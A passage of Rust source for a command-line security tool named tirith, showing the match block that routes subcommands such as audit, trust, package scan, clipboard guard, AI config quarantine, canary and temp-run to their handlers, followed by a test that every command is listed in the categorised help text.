                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::audit::stats(session.as_deref(), json, &entry_type)
            }
            AuditAction::Report {
                format,
                since,
                entry_type,
            } => {
                let format_str = match format {
                    AuditReportFormat::Markdown => "markdown",
                    AuditReportFormat::Json => "json",
                    AuditReportFormat::Html => "html",
                };
                cli::audit::report(format_str, since.as_deref(), &entry_type)
            }
            AuditAction::Verify {
                expected_head,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::audit::verify(expected_head.as_deref(), json)
            }
        },

        Commands::Receipt { action } => match action {
            ReceiptAction::Last { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::receipt::last(json)
            }
            ReceiptAction::List { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::receipt::list(json)
            }
            ReceiptAction::Verify {
                sha256,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::receipt::verify(&sha256, json)
            }
        },

        Commands::Checkpoint { action } => match action {
            CheckpointAction::Create {
                paths,
                trigger,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::create_checkpoint(&paths, trigger.as_deref(), json)
            }
            CheckpointAction::List { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::list_checkpoints(json)
            }
            CheckpointAction::Restore { id, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::restore_checkpoint(&id, json)
            }
            CheckpointAction::Diff { id, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::diff_checkpoint(&id, json)
            }
            CheckpointAction::Purge { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::purge_checkpoints(json)
            }
            CheckpointAction::Watch {
                paths,
                with_net_hints,
                format,
                json,
                command,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::checkpoint::watch(&command, &paths, with_net_hints, json)
            }
        },

        Commands::Pending { action } => match action {
            PendingAction::List { json } => cli::pending::list(json),
            PendingAction::Resolve { id, action, reason } => {
                cli::pending::resolve(&id, &action, reason)
            }
            PendingAction::Export { output } => cli::pending::export(output),
        },

        Commands::Activate { key } => cli::license_cmd::activate(&key),

        Commands::License {
            action,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            match action {
                None => cli::license_cmd::show(json),
                Some(LicenseAction::Deactivate) => cli::license_cmd::deactivate(),
                Some(LicenseAction::Refresh) => cli::license_cmd::refresh(),
            }
        }

        Commands::Trust { action } => match action {
            TrustAction::Add {
                pattern,
                rule,
                ttl,
                permanent,
                broad,
                reason,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::add(
                    &pattern,
                    rule.as_deref(),
                    ttl.as_deref(),
                    permanent,
                    broad,
                    reason.as_deref(),
                    &scope,
                    json,
                )
            }
            TrustAction::List {
                rule,
                format,
                json,
                expired,
                scope,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::snapshot_current_trust();
                cli::trust::list(rule.as_deref(), json, expired, &scope)
            }
            TrustAction::Explain {
                pattern,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::explain(&pattern, &scope, json)
            }
            TrustAction::Diff { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::diff(json)
            }
            TrustAction::Remove {
                pattern,
                rule,
                scope,
            } => cli::trust::remove(&pattern, rule.as_deref(), &scope),
            TrustAction::Last => cli::trust::last(),
            TrustAction::FromLastTrigger { apply } => cli::trust::from_last_trigger(apply),
            TrustAction::Gc {
                expired,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::gc(expired, &scope, json)
            }
            TrustAction::Prune {
                expired,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::prune(expired, &scope, json)
            }
            TrustAction::Audit {
                since,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::trust::audit(since.as_deref(), json)
            }
        },

        Commands::Init {
            shell,
            prompt_status,
        } => cli::init::run(shell.as_deref(), prompt_status),

        // The mutually-exclusive mode flags collapse to one `mode` string; `None` = auto-detect.
        Commands::Onboard {
            repo,
            team,
            ai_agent_heavy,
            apply,
            json,
        } => {
            let mode = if repo {
                Some("repo")
            } else if team {
                Some("team")
            } else if ai_agent_heavy {
                Some("ai-agent-heavy")
            } else {
                None
            };
            cli::onboard::run(mode, apply, json)
        }

        Commands::Dashboard { action } => match action {
            DashboardAction::Export { out, json } => cli::dashboard::export(out.as_deref(), json),
            DashboardAction::Serve { port, json } => cli::dashboard::serve(port, json),
        },

        Commands::PromptStatus {
            short,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::prompt_status::run(short, json)
        }

        Commands::Status { json } => cli::status::run(json),

        Commands::Warnings {
            clear,
            session,
            format,
            json,
            summary,
            hidden,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::warnings::run(clear, session.as_deref(), json, summary, hidden)
        }

        Commands::Package { action } => match action {
            PackageAction::Risk {
                ecosystem,
                name,
                path,
                online,
                offline,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::package::risk(&ecosystem, &name, path.as_deref(), online, offline, json)
            }
            PackageAction::Explain {
                ecosystem,
                name,
                path,
                online,
                offline,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::package::explain(&ecosystem, &name, path.as_deref(), online, offline, json)
            }
            PackageAction::Scan {
                installed,
                lockfile,
                path,
                online,
                offline,
                max_installed_entries,
                non_interactive,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::package::scan(
                    installed,
                    lockfile.as_deref(),
                    path.as_deref(),
                    online,
                    offline,
                    max_installed_entries,
                    non_interactive,
                    json,
                )
            }
            PackageAction::Inspect {
                artifact,
                artifact_set,
                installed,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::package::inspect(
                    &artifact,
                    artifact_set.as_deref(),
                    installed.as_deref(),
                    json,
                )
            }
        },

        Commands::Ecosystem { action } => match action {
            EcosystemAction::Scan {
                path,
                online,
                offline,
                installed,
                max_installed_entries,
                non_interactive,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ecosystem::scan(
                    path.as_deref(),
                    online,
                    offline,
                    installed,
                    max_installed_entries,
                    non_interactive,
                    json,
                )
            }
        },

        Commands::ThreatDb { action } => match action {
            ThreatDbAction::Update { force, background } => {
                cli::threatdb_cmd::update(force, background)
            }
            ThreatDbAction::Status { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::threatdb_cmd::status(json)
            }
            ThreatDbAction::Explain {
                indicator,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::threatdb_cmd::explain(&indicator, json)
            }
            ThreatDbAction::Sources { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::threatdb_cmd::sources(json)
            }
            ThreatDbAction::Health { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::threatdb_cmd::health(json)
            }
            ThreatDbAction::Diff {
                since,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::threatdb_cmd::diff(&since, json)
            }
        },

        Commands::Doctor {
            format,
            json,
            reset_bash_safe_mode,
            fix,
            yes,
            simulate_enter,
            compat,
            bundle,
            quick,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::doctor::run(
                json,
                reset_bash_safe_mode,
                fix,
                yes,
                simulate_enter,
                compat,
                bundle,
                quick,
            )
        }

        Commands::Completions { shell } => cli::completions::run(shell),

        Commands::Lsp => cli::lsp::run(),

        Commands::Manpage => cli::manpage::run(),

        Commands::VerifySelf { format, json } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::selfupdate::verify_self(json)
        }

        Commands::Update {
            allow_unsigned,
            rollback,
            dry_run,
            yes,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::selfupdate::update(allow_unsigned, rollback, dry_run, yes, json)
        }

        Commands::Version {
            provenance,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::selfupdate::version(provenance, json)
        }

        Commands::View {
            path,
            max_bytes,
            json,
        } => {
            let path_arg = match path.as_deref() {
                None | Some("-") => None,
                Some(p) => Some(std::path::PathBuf::from(p)),
            };
            cli::view::run(path_arg.as_deref(), max_bytes, json)
        }

        Commands::Output { action } => match action {
            OutputAction::Wrap { action } => cli::output_guard::run(&action),
        },

        Commands::Share {
            path,
            target,
            out,
            json,
        } => {
            // value_parser already constrained `target`; this is defensive.
            let audience = match cli::share::parse_audience(&target) {
                Ok(a) => a,
                Err(msg) => {
                    eprintln!("tirith share: {msg}");
                    std::process::exit(2);
                }
            };
            let path_arg = match path.as_deref() {
                None | Some("-") => None,
                Some(p) => Some(std::path::PathBuf::from(p)),
            };
            let out_arg = cli::share::resolve_out_path(out.as_deref());
            cli::share::share(path_arg.as_deref(), out_arg.as_deref(), audience, json)
        }

        Commands::Redact { audience, json } => {
            let aud = match cli::share::parse_audience(&audience) {
                Ok(a) => a,
                Err(msg) => {
                    eprintln!("tirith redact: {msg}");
                    std::process::exit(2);
                }
            };
            cli::share::redact_stdin(aud, json)
        }

        Commands::Clipboard { action } => match action {
            ClipboardAction::Copy {
                path,
                redact,
                audience,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::clipboard::copy(&path, redact, audience.as_deref(), json)
            }
            ClipboardAction::Scan { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::clipboard::scan(json)
            }
            ClipboardAction::Guard { action } => match action {
                GuardAction::InstallService {
                    apply,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::clipboard::install_service(apply, json)
                }
                GuardAction::UninstallService { format, json } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::clipboard::uninstall_service(json)
                }
                GuardAction::Status { format, json } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::clipboard::status(json)
                }
            },
            ClipboardAction::Daemon {
                foreground,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                if !foreground {
                    eprintln!(
                        "tirith clipboard daemon: --foreground is required (this binary has no background mode; use `tirith clipboard guard install-service` to run under launchd/systemd)"
                    );
                    std::process::exit(2);
                }
                cli::clipboard::daemon_foreground(json)
            }
            ClipboardAction::Watch { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::clipboard::watch(json)
            }
        },

        Commands::Logs { action } => match action {
            LogsAction::Scan { path, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::logs::scan(&path, json)
            }
            LogsAction::Summarize {
                path,
                safe_for_agent,
                max_lines,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::logs::summarize(&path, safe_for_agent, max_lines, json)
            }
            LogsAction::Redact {
                path,
                audience,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::logs::redact(&path, &audience, json)
            }
        },

        Commands::Context { action } => match action {
            ContextAction::Status { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::context::status(json)
            }
            ContextAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::context::guard(&action, json)
            }
            ContextAction::Label {
                label_key,
                criticality,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                let parsed_scope = match cli::context::LabelScope::parse(&scope) {
                    Some(s) => s,
                    None => {
                        eprintln!(
                            "tirith context label: --scope must be 'user' or 'repo' (got {scope})"
                        );
                        std::process::exit(2);
                    }
                };
                cli::context::label(&label_key, &criticality, parsed_scope, json)
            }
        },

        Commands::Ssh { action } => match action {
            SshAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ssh::guard(&action, json)
            }
            SshAction::Label {
                host,
                criticality,
                scope,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                let parsed_scope = match cli::ssh::LabelScope::parse(&scope) {
                    Some(s) => s,
                    None => {
                        eprintln!(
                            "tirith ssh label: --scope must be 'user' or 'repo' (got {scope})"
                        );
                        std::process::exit(2);
                    }
                };
                cli::ssh::label(&host, &criticality, parsed_scope, json)
            }
            SshAction::Bootstrap {
                target,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ssh::bootstrap_stub(&target, json)
            }
        },

        Commands::Iac { action } => match action {
            IacAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::iac::guard(&action, json)
            }
            IacAction::CheckPlan {
                plan,
                tool,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::iac::check_plan(&plan, tool.as_deref(), json)
            }
            IacAction::RequirePlanBeforeApply {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::iac::require_plan_before_apply(&action, json)
            }
        },

        Commands::Sudo { action } => match action {
            SudoAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::sudo::guard(&action, json)
            }
            SudoAction::Session { action } => match action {
                SudoSessionAction::Start {
                    ttl,
                    reason,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::sudo::session_start(ttl.as_deref(), reason.as_deref(), json)
                }
                SudoSessionAction::End { format, json } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::sudo::session_end(json)
                }
                SudoSessionAction::Status { format, json } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::sudo::session_status(json)
                }
            },
            SudoAction::RequireReason {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::sudo::require_reason(&action, json)
            }
        },

        Commands::Devcontainer { action } => match action {
            DevcontainerAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::devcontainer::guard(&action, json)
            }
            DevcontainerAction::Inject {
                path,
                create,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::devcontainer::inject(path.as_deref(), create, json)
            }
        },

        Commands::Codespaces { action } => match action {
            CodespacesAction::Setup { path, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::codespaces::setup(path.as_deref(), json)
            }
            CodespacesAction::Inject {
                path,
                create,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::codespaces::inject(path.as_deref(), create, json)
            }
        },

        Commands::Hygiene { action } => match action {
            HygieneAction::Scan { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::hygiene::scan(json)
            }
            HygieneAction::Fix {
                dry_run,
                yes,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::hygiene::fix(dry_run, yes, json)
            }
        },
        Commands::Persistence { action } => match action {
            PersistenceAction::Scan { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::persistence::scan(json)
            }
            PersistenceAction::Diff { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::persistence::diff(json)
            }
            PersistenceAction::Watch {
                interval,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::persistence::watch(interval, json)
            }
        },
        Commands::Aliases { action } => match action {
            AliasesAction::Scan {
                include_runtime,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::aliases::scan(include_runtime, json)
            }
            AliasesAction::Explain {
                name,
                include_runtime,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::aliases::explain(&name, include_runtime, json)
            }
        },
        Commands::Env { action } => match action {
            EnvAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::env_guard::guard(&action, json)
            }
            EnvAction::Diff {
                reset,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::env_guard::diff(reset, json)
            }
            EnvAction::Explain { var, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::env_guard::explain(&var, json)
            }
            EnvAction::Snapshot => cli::env_guard::snapshot_write(),
        },
        Commands::Exec { action } => match action {
            ExecAction::Check { bin, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::exec::check(&bin, json)
            }
            ExecAction::Provenance { path, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::exec::provenance(&path, json)
            }
            ExecAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::exec::guard(&action, json)
            }
        },
        Commands::Path { action } => match action {
            PathAction::Audit { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::path::audit(json)
            }
            PathAction::Watch {
                interval,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::path::watch(interval, json)
            }
            PathAction::Which {
                cmd,
                secure,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::path::which(&cmd, secure, json)
            }
        },
        Commands::Hooks { action } => match action {
            HooksAction::Scan { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::hooks::scan(json)
            }
            HooksAction::Guard {
                action,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::hooks::guard(&action, json)
            }
            HooksAction::Explain { name, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::hooks::explain(&name, json)
            }
        },
        Commands::Preview {
            format,
            json,
            command,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::preview::run(&command.join(" "), json)
        }
        Commands::Watch {
            paths,
            with_net_hints,
            format,
            json,
            command,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            // Identical impl to `tirith checkpoint watch` (CheckpointAction::Watch).
            cli::checkpoint::watch(&command, &paths, with_net_hints, json)
        }
        Commands::Taint { action } => match action {
            TaintAction::List { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::taint::list(json)
            }
            TaintAction::Explain { file, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::taint::explain(&file, json)
            }
            TaintAction::Clear {
                file,
                yes,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::taint::clear(&file, yes, json)
            }
        },
        Commands::Intend {
            intent,
            explain,
            format,
            json,
            command,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::intent::run(&intent, &command.join(" "), explain, json)
        }
        Commands::Baseline { action } => match action {
            BaselineAction::Learn { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::baseline::learn(json)
            }
            BaselineAction::Status { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::baseline::status(json)
            }
            BaselineAction::Reset { yes, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::baseline::reset(yes, json)
            }
        },
        Commands::CommandCard { action } => match action {
            CommandCardAction::Create {
                command,
                expected_domain,
                script_sha256,
                writes,
                requires_sudo,
                expires,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::command_card::create(
                    command,
                    expected_domain,
                    script_sha256,
                    writes,
                    requires_sudo,
                    expires,
                    json,
                )
            }
            CommandCardAction::Sign {
                key,
                card,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::command_card::sign(&key, &card, json)
            }
            CommandCardAction::Verify { card, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::command_card::verify(&card, json)
            }
            #[cfg(unix)]
            CommandCardAction::Fetch { url, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::command_card::fetch(&url, json)
            }
        },

        // Variant is `RepoCmd` (clippy `enum_variant_names` rejects a variant
        // ending in `Commands`); the CLI word is `commands` via `#[command(name)]`.
        Commands::RepoCmd { action } => match action {
            RepoCommandsAction::Init {
                force,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::commands::init(force, json)
            }
            RepoCommandsAction::List { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::commands::list(json)
            }
            RepoCommandsAction::Run { name, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::commands::run(&name, json)
            }
            RepoCommandsAction::Check {
                shell,
                format,
                json,
                cmd,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                // `shell_join` preserves argv word boundaries so a multi-word
                // arg can't be re-split and skew the verdict (CodeRabbit R13b).
                cli::commands::check(&cli::shell_join(&cmd), &shell, json)
            }
        },

        Commands::Ai { action } => match action {
            AiAction::Scan { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ai::scan(json)
            }
            AiAction::Diff { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ai::diff(json)
            }
            AiAction::Quarantine {
                file,
                r#move,
                yes,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ai::quarantine(&file, r#move, yes, json)
            }
            AiAction::ExplainConfig { file, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ai::explain_config(&file, json)
            }
            AiAction::Snapshot {
                update,
                force,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::ai::snapshot(update, force, json)
            }
        },
        Commands::Canary { action } => match action {
            CanaryAction::Create {
                kind,
                callback_url,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::canary::create(&kind, callback_url, json)
            }
            CanaryAction::Status { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::canary::status(json)
            }
            CanaryAction::List { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::canary::list(json)
            }
            CanaryAction::Prune {
                id,
                yes,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::canary::prune(&id, yes, json)
            }
            CanaryAction::Rotate { id, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::canary::rotate(&id, json)
            }
        },

        // Guidance only: 0 network calls, no new RuleIds; tirith does NOT rotate.
        Commands::Secret { action } => match action {
            SecretAction::Triage {
                verbose,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::secret::triage(json, verbose)
            }
            SecretAction::Rotate {
                provider,
                verbose,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::secret::rotate(&provider, json, verbose)
            }
            SecretAction::Revoke {
                provider,
                verbose,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::secret::revoke(&provider, json, verbose)
            }
        },

        Commands::Incident { action } => match action {
            IncidentAction::Start {
                reason,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::incident::start(reason, json)
            }
            IncidentAction::Stop { yes, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::incident::stop(yes, json)
            }
            IncidentAction::Status { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::incident::status(json)
            }
            IncidentAction::Report { out, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::incident::report(out, json)
            }
        },

        Commands::VisualAudit {
            non_interactive,
            pairs,
            json,
        } => cli::visual_audit::run(non_interactive, pairs, json),

        Commands::Browser { action } => match action {
            BrowserAction::Host => cli::browser_host::run(),
            BrowserAction::InstallExtension {
                extension_id,
                browser,
                apply,
                json,
            } => match browser.parse::<cli::browser::Browser>() {
                Ok(browser) => cli::browser::install_extension(extension_id, browser, apply, json),
                // Invalid `--browser` is a usage error → exit 2 (like share/redact).
                Err(e) => {
                    eprintln!("tirith browser install-extension: {e}");
                    2
                }
            },
        },

        // `temp-run` and its hidden `sandbox-dir` alias share one impl.
        Commands::TempRun {
            copy_repo,
            strip_env,
            capsule,
            json,
            command,
        }
        | Commands::SandboxDir {
            copy_repo,
            strip_env,
            capsule,
            json,
            command,
        } => cli::temp_run::run(&command, copy_repo, strip_env, capsule, json),
    };

    std::process::exit(exit_code);
}

#[cfg(test)]
mod help_category_tests {
    use super::{Cli, COMMANDS_BY_CATEGORY};
    use clap::CommandFactory;

    /// Every non-hidden top-level command must appear in the categorized help
    /// block, so `tirith --help`'s overview never silently drifts from the real
    /// command set when a new subcommand is added.
    #[test]
    fn every_command_is_categorized() {
        // `Cli::command()` builds a very large command tree; the default ~2 MiB
        // test-thread stack overflows in debug, so build it on a roomier stack.
        std::thread::Builder::new()
            .stack_size(16 * 1024 * 1024)
            .spawn(|| {
                let cmd = Cli::command();
                for sub in cmd.get_subcommands() {
                    if sub.is_hide_set() {
                        continue;
                    }
                    let name = sub.get_name();
                    if name == "help" {
                        continue; // clap's auto-generated built-in
                    }
                    // Token-level match (not substring): a command name must appear
                    // as a whole whitespace-delimited token, so e.g. `run` can't
                    // false-pass by being a substring of `temp-run`.
                    assert!(
                        COMMANDS_BY_CATEGORY
                            .split_whitespace()
                            .any(|tok| tok == name),
                        "command `{name}` is missing from COMMANDS_BY_CATEGORY — add it to a category"
                    );
                }
            })
            .unwrap()
            .join()
            .unwrap();
    }
}
